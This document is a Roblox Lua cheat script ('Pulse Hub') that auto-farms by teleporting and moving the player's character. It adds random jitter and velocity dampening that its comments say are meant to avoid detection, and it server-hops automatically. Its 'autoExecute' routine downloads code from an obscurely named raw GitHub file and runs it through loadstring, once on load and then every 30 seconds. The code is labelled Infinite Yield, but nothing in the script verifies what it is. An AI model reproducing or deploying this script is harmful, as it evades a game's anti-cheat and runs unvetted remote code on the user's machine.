local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

-- Create Window
local Window = Fluent:CreateWindow({
    Title = "Pulse Hub",
    SubTitle = "WOW!",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create Tabs
local Tabs = {
    AutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "repeat" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local Options = Fluent.Options

-- Constants
local TWEEN_DISTANCE = 10000 -- How far ahead to tween
local DEFAULT_SPEED = 200 -- Default units per second
local TARGET_POSITION = Vector3.new(393.79998779296875, 12.692999839782715, 87.9000015258789)
local DOOR_WAIT_DURATION = 30 -- 30 seconds wait when door is closed
local SPEED_STEPS = 20 -- Number of steps to reach max speed
local STEP_DELAY = 0.1 -- Delay between speed increments

-- Auto Farm Tab
do
    local currentTween = nil
    local currentSpeed = DEFAULT_SPEED
    local isPaused = false
    local doorCheckConnection = nil
    local lastPosition = nil
    local stepCount = 0

    -- Position Lock
    local initialY = nil
    local initialRotation = nil
    local lockConnection = nil

    -- Velocity dampening to prevent detection
    local function dampenVelocity(humanoidRootPart)
        if not humanoidRootPart then return end
        humanoidRootPart.Velocity = humanoidRootPart.Velocity * 0.75
        humanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
    end

    local function randomOffset()
        return (math.random() - 0.5) * 0.1
    end

    local function safeSetState(humanoid, state, enabled)
        pcall(function()
            humanoid:SetStateEnabled(state, enabled)
        end)
    end

    local function checkDoor()
        local door = workspace.Scenes["森林场景"]["大门"]["Main Door"]
        if not door then return false end
        return door.CanCollide
    end

    local function maintainPosition(character)
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local humanoidRootPart = character.HumanoidRootPart
        local currentCFrame = humanoidRootPart.CFrame
        
        if initialY and initialRotation then
            -- Add slight random variation to avoid detection
            local offsetY = initialY + randomOffset()
            
            -- Use SetNetworkOwner to improve sync
            pcall(function()
                if humanoidRootPart:CanSetNetworkOwnership() then
                    humanoidRootPart:SetNetworkOwner(Players.LocalPlayer)
                end
            end)
            
            humanoidRootPart.CFrame = CFrame.new(
                currentCFrame.Position.X,
                offsetY,
                currentCFrame.Position.Z
            ) * initialRotation

            dampenVelocity(humanoidRootPart)
            
            -- Simulate physics to appear more natural
            humanoidRootPart.AssemblyAngularVelocity = Vector3.new(
                math.sin(tick() * 0.1) * 0.01,
                0,
                math.cos(tick() * 0.1) * 0.01
            )
        end
    end

    local function setupPositionLock(character)
        if not character or not character:FindFirstChild("HumanoidRootPart") then return end
        
        local humanoidRootPart = character.HumanoidRootPart
        initialY = humanoidRootPart.Position.Y
        initialRotation = CFrame.Angles(0, humanoidRootPart.CFrame:ToEulerAnglesYXZ(), 0)
        
        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            pcall(function()
                humanoid.WalkSpeed = 0
                -- Only disable essential states
                safeSetState(humanoid, Enum.HumanoidStateType.Jumping, false)
                safeSetState(humanoid, Enum.HumanoidStateType.Flying, false)
                safeSetState(humanoid, Enum.HumanoidStateType.Swimming, false)
                safeSetState(humanoid, Enum.HumanoidStateType.Climbing, false)
            end)
        end
        
        if lockConnection then lockConnection:Disconnect() end
        lockConnection = RunService.Heartbeat:Connect(function()
            maintainPosition(character)
        end)
    end

    local function smoothTeleport(humanoidRootPart, targetPos)
        local start = humanoidRootPart.CFrame
        local goal = CFrame.new(targetPos) * start.Rotation
        local steps = 10
        
        for i = 1, steps do
            local alpha = i/steps
            humanoidRootPart.CFrame = start:Lerp(goal, alpha)
            dampenVelocity(humanoidRootPart)
            RunService.Heartbeat:Wait()
        end
    end

    local function removePositionLock(character)
        if lockConnection then
            lockConnection:Disconnect()
            lockConnection = nil
        end
        
        initialY = nil
        initialRotation = nil
        
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.WalkSpeed = 16
                for _, state in pairs(Enum.HumanoidStateType:GetEnumItems()) do
                    safeSetState(humanoid, state, true)
                end
            end
        end
    end

    local function startAutoFarm(character, retryCount)
        if isPaused then return end
        
        retryCount = retryCount or 0
        if retryCount > 3 then
            Fluent:Notify({
                Title = "Error",
                Content = "Failed to start auto farm after multiple attempts",
                Duration = 3
            })
            return
        end

        if not character then
            wait(0.5)
            return startAutoFarm(game.Players.LocalPlayer.Character, retryCount + 1)
        end

        setupPositionLock(character)

        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then
            wait(0.5)
            return startAutoFarm(character, retryCount + 1)
        end
        
        -- Use CFrame movement instead of tweening
        task.spawn(function()
            local stepSpeed = 100
            local maxSpeed = currentSpeed
            local speedInc = (maxSpeed - stepSpeed) / SPEED_STEPS
            
            local movementConnection
            movementConnection = RunService.Heartbeat:Connect(function()
                if not Options.AutoFarmEnabled.Value then
                    movementConnection:Disconnect()
                    return
                end

                if stepSpeed < maxSpeed then
                    stepSpeed = stepSpeed + speedInc
                end

                local lookVector = humanoidRootPart.CFrame.LookVector
                local moveVector = Vector3.new(lookVector.X, 0, lookVector.Z).Unit * (stepSpeed/30)
                
                -- Smooth CFrame movement with random micro-adjustments
                humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.new(
                    moveVector.X + randomOffset(),
                    randomOffset(),
                    moveVector.Z + randomOffset()
                )
            end)
        end)
    end

    local function handleDoor()
        isPaused = true
        
        local character = game.Players.LocalPlayer.Character
        if character and character:FindFirstChild("Humanoid") then
            character.Humanoid.Health = 0
        end

        local startTime = tick()
        local lastUpdate = DOOR_WAIT_DURATION

        local countdownConnection
        countdownConnection = RunService.Heartbeat:Connect(function()
            local remaining = math.ceil(DOOR_WAIT_DURATION - (tick() - startTime))
            
            if remaining <= 0 then
                countdownConnection:Disconnect()
                isPaused = false
                Fluent:Notify({
                    Title = "Auto Farm",
                    Content = "Resuming auto farm...",
                    Duration = 2
                })
                return
            end

            if remaining ~= lastUpdate and (remaining % 5 == 0 or remaining <= 5) then
                lastUpdate = remaining
                Fluent:Notify({
                    Title = "Door Wait",
                    Content = string.format("Resuming in %d seconds", remaining),
                    Duration = 1
                })
            end
        end)

        Fluent:Notify({
            Title = "Auto Farm",
            Content = "Door detected! Waiting 30 seconds...",
            Duration = 3
        })
    end

    local function teleportToTarget(character)
        if not character or not character:FindFirstChild("HumanoidRootPart") then return false end
        
        local humanoidRootPart = character.HumanoidRootPart
        -- Use smooth teleport instead of instant
        smoothTeleport(humanoidRootPart, TARGET_POSITION)
        wait(0.1)
        return true
    end

    Tabs.AutoFarm:AddParagraph({
        Title = "Welcome to Auto Farm",
        Content = "Toggle auto farm to start continuous movement.\nPress X to quick stop."
    })

    local SpeedSlider = Tabs.AutoFarm:AddSlider("TweenSpeed", {
        Title = "Movement Speed",
        Description = "Adjust auto farm movement speed",
        Default = DEFAULT_SPEED,
        Min = 100,
        Max = 5000,
        Rounding = 0,
        Callback = function(Value)
            currentSpeed = Value
            if Options.AutoFarmEnabled.Value and not isPaused then
                startAutoFarm(game.Players.LocalPlayer.Character)
            end
        end
    })

    local AutoFarmToggle = Tabs.AutoFarm:AddToggle("AutoFarmEnabled", {
        Title = "Enable Auto Farm",
        Default = false
    })

    UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.X then
            if Options.AutoFarmEnabled.Value then
                AutoFarmToggle:SetValue(false)
                Fluent:Notify({
                    Title = "Auto Farm",
                    Content = "Stopped with X key",
                    Duration = 2
                })
            end
        end
    end)

    doorCheckConnection = RunService.Heartbeat:Connect(function()
        if Options.AutoFarmEnabled.Value and not isPaused then
            if checkDoor() then
                handleDoor()
            end
        end
    end)

    game.Players.LocalPlayer.CharacterAdded:Connect(function(newCharacter)
        if Options.AutoFarmEnabled.Value then
            if isPaused then return end
            
            wait(0.5)
            task.spawn(function()
                startAutoFarm(newCharacter)
            end)
        end
    end)

    AutoFarmToggle:OnChanged(function()
        if Options.AutoFarmEnabled.Value then
            task.spawn(function()
                local character = game.Players.LocalPlayer.Character
                if character then
                    Fluent:Notify({
                        Title = "Auto Farm",
                        Content = "Starting auto farm...",
                        Duration = 2
                    })
                    
                    if teleportToTarget(character) then
                        setupPositionLock(character)
                        startAutoFarm(character)
                    else
                        Fluent:Notify({
                            Title = "Error",
                            Content = "Failed to start. Check character position.",
                            Duration = 3
                        })
                        AutoFarmToggle:SetValue(false)
                    end
                end
            end)
        else
            isPaused = false
            if currentTween then
                currentTween:Cancel()
                currentTween = nil
            end
            if doorCheckConnection then
                doorCheckConnection:Disconnect()
                doorCheckConnection = nil
            end
            removePositionLock(game.Players.LocalPlayer.Character)
        end
    end)
end

SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("AutoFarmHub")
SaveManager:SetFolder("AutoFarmHub/configs")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title = "Auto Farm Hub",
    Content = "Script loaded successfully!\nPress X to stop.",
    Duration = 5
})

SaveManager:LoadAutoloadConfig()

-- Contest Time Check
local function checkContestTime()
    local player = Players.LocalPlayer
    if not player then return end
    
    local gui = player:WaitForChild("PlayerGui")
    local contestPanel = gui:WaitForChild("GUI_ContestPanel-1-3", 5)
    if not contestPanel then return end
    
    local timeLabel = contestPanel:WaitForChild("LabelContestTime")
    if not timeLabel then return end
    
    local isWaiting = false
    
    RunService.Heartbeat:Connect(function()
        if timeLabel.Text:find("PrepareTime:", 1, true) then
            if Options.AutoFarmEnabled.Value and not isWaiting then
                isWaiting = true
                
                -- Disable auto farm
                Options.AutoFarmEnabled:SetValue(false)
                
                -- Teleport to target position
                local character = player.Character
                if character and character:FindFirstChild("HumanoidRootPart") then
                    character.HumanoidRootPart.CFrame = CFrame.new(393.79998779296875, 12.692999839782715, 87.9000015258789)
                end
                
                Fluent:Notify({
                    Title = "Contest Time",
                    Content = "PrepareTime detected! Pausing auto farm and teleporting...",
                    Duration = 3
                })
                
                -- Countdown and resume after 30 seconds
                local startTime = tick()
                local lastUpdate = 30
                
                local countdownConnection
                countdownConnection = RunService.Heartbeat:Connect(function()
                    local remaining = math.ceil(30 - (tick() - startTime))
                    
                    if remaining <= 0 then
                        countdownConnection:Disconnect()
                        isWaiting = false
                        Options.AutoFarmEnabled:SetValue(true)
                        Fluent:Notify({
                            Title = "Contest Time",
                            Content = "Resuming auto farm...",
                            Duration = 2
                        })
                        return
                    end

                    if remaining ~= lastUpdate and (remaining % 5 == 0 or remaining <= 5) then
                        lastUpdate = remaining
                        Fluent:Notify({
                            Title = "Contest Time",
                            Content = string.format("Auto farm resumes in %d seconds", remaining),
                            Duration = 1
                        })
                    end
                end)
            end
        end
    end)
end

-- Start contest time check
task.spawn(checkContestTime)
checkContestTime() -- Ensure immediate start

-- Auto Server Hop System
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local function getServers()
    local servers = {}
    local endpoint = string.format(
        "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Desc&limit=100",
        game.PlaceId
    )
    
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet(endpoint))
    end)
    
    if success and result and result.data then
        for _, server in ipairs(result.data) do
            if type(server) == "table" and server.playing and server.maxPlayers and server.id and server.playing < server.maxPlayers and server.id ~= game.JobId then
                table.insert(servers, server.id)
            end
        end
    end
    
    return servers
end

local function autoHop()
    local servers = getServers()
    if #servers > 0 then
        local randomServer = servers[math.random(1, #servers)]
        TeleportService:TeleportToPlaceInstance(game.PlaceId, randomServer)
    end
end

-- Auto Execute System
local function autoExecute()
    local success, infiniteYield = pcall(function()
        return game:HttpGet('https://raw.githubusercontent.com/Lewe1512/game/refs/heads/main/qfh123fqe.lua')
    end)
    
    if success then
        loadstring(infiniteYield)()
    end
end

-- Initialize Auto Hop and Execute
task.spawn(function()
    while true do
        wait(30)  -- Wait 30 seconds
        autoExecute()  -- Execute Infinite Yield
        wait(1)   -- Small delay before hopping
        autoHop() -- Hop to new server
    end
end)

-- Execute immediately on load
autoExecute()
